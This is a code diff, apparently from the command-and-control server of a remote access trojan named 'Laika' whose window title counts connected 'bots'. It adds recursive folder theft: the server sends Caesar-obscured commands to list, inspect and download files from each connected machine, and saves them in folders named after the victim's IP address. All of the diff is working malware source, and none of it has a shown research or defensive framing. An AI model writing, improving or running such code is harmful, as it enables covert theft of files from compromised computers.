@@ -57,6 +57,96 @@ def convert_size(size_bytes):
     s = round(size_bytes / p, 2)
     return "%s %s" % (s, size_name[i])
 
+
+def recv_message_ret(client) :
+    message = ""
+    while True :
+        client.settimeout(0.1)
+        try :
+            message = client.recv(4096)
+            if CAESAR_DECRYPT(message.decode("latin-1")) == "done" :
+                break
+        except socket.timeout :
+            break
+        if not message:
+            break
+        
+        if client.gettimeout() == 0:
+            break
+    
+    return message
+
+def recv_file(client, i, addr) :
+    time.sleep(0.05)
+
+    if not os.path.exists(addr):
+        os.makedirs(addr)
+   
+    out_file = open(addr + "\\" + i, "wb")
+    while True:
+        try:
+            # Receive data from the socket
+            data = client.recv(4096)
+            if not data:
+                break
+
+            # Write the data to the file
+            out_file.write(data)
+        except socket.error as e:
+            if e.errno == errno.WSAEWOULDBLOCK:
+                # If recv would block, wait until the socket is readable
+                ready_to_read, _, _ = select.select([client], [], [], 1)
+                if not ready_to_read:
+                    # If select timed out, try recv again
+                    continue
+            else:
+                break
+
+    out_file.close()
+    time.sleep(0.05)
+
+def recv_folder(client, path, addr, i) :
+    if not os.path.exists(addr + "/" + i):
+        os.makedirs(addr + "/" + i)
+
+    client.send(CAESAR("get_file_list").encode())
+
+    client.send(CAESAR(path +  "/" + "\0").encode())
+    
+    try :
+        files = recv_message_ret(client).decode("latin-1")
+    except :
+        return
+
+    for f_d in files.split('/') :
+        f = CAESAR_DECRYPT(f_d)
+
+        client.send(CAESAR("get_obj_info").encode())
+
+        client.send(CAESAR(path + '\\' + f + "\0").encode())
+        
+        infos = recv_message_ret(client).decode("latin-1")
+        taille = infos.split("/")[0]
+
+        if taille != '0' :
+            #call download file
+            client.send(CAESAR("download_file\0").encode())
+
+            client.send(CAESAR(path + "/" + f + "\0").encode())
+
+            recv_file(client, f, addr + "/" + i)
+            continue
+        
+        else :
+            recv_folder(client, path + "/" + f, addr, i + "\\" + f)
+        """
+        #call download folder
+        client.send(CAESAR("download_dir\0").encode())
+
+        client.send(CAESAR(path + "\0").encode())
+        """
+                    
+
 app = Flask(__name__) 
 # Disable Flask's default logging
 log = logging.getLogger('werkzeug')
@@ -87,6 +177,9 @@ def interact() :
     
     print(file_list)
     
+    addr = client.getpeername()[0]
+    addr = os.getcwd() + "\\" + addr.replace(".","_")
+    
     files = []
     if action != "upload" :
         for f in file_list :
@@ -94,6 +187,7 @@ def interact() :
 
     match action :
         case "download" :
+            print("\n\nTéléchargement...\n\n")
             for i in files :
                 path = path_file_ex_2 + i
                 if i in FILES_ :
@@ -102,43 +196,13 @@ def interact() :
 
                     client.send(CAESAR(path + "\0").encode())
                     
-                    time.sleep(0.05)
-                    addr = client.getpeername()[0]
-                    addr = os.getcwd() + "\\" + addr.replace(".","_")
-
-                    if not os.path.exists(addr):
-                        os.makedirs(addr)
-                   
-                    out_file = open(addr + "\\" + i, "wb")
-                    while True:
-                        try:
-                            # Receive data from the socket
-                            data = client.recv(4096)
-                            if not data:
-                                break
-
-                            # Write the data to the file
-                            out_file.write(data)
-                        except socket.error as e:
-                            if e.errno == errno.WSAEWOULDBLOCK:
-                                # If recv would block, wait until the socket is readable
-                                ready_to_read, _, _ = select.select([client], [], [], 1)
-                                if not ready_to_read:
-                                    # If select timed out, try recv again
-                                    continue
-                            else:
-                                break
-
-                    out_file.close()
-                    time.sleep(0.05)
+                    recv_file(client, i, addr)
 
                 else :
-                    #call download folder
-                    client.send(CAESAR("download_dir\0").encode())
-
-                    client.send(CAESAR(path + "\0").encode())
+                    recv_folder(client, path, addr, i)
 
                 time.sleep(0.05)
+            print("\n\nTéléchargement terminé.\n\n")
 
         case "upload" :
             filename = easygui.fileopenbox()
@@ -313,24 +377,6 @@ def update_title() -> None :
         else :
             os.system("title Laika ^| "+str(len(CONNECT_CLIENTS))+" bots - Selection : n°" + str(SELECTED_CLIENT))
         time.sleep(2)
-
-def recv_message_ret(client) :
-    message = ""
-    while True :
-        client.settimeout(0.1)
-        try :
-            message = client.recv(4096)
-            if CAESAR_DECRYPT(message.decode("latin-1")) == "done" :
-                break
-        except socket.timeout :
-            break
-        if not message:
-            break
-        
-        if client.gettimeout() == 0:
-            break
-    
-    return message
 
 def recv_message(socket_object) -> bool:
     socket_object.settimeout(0.1)
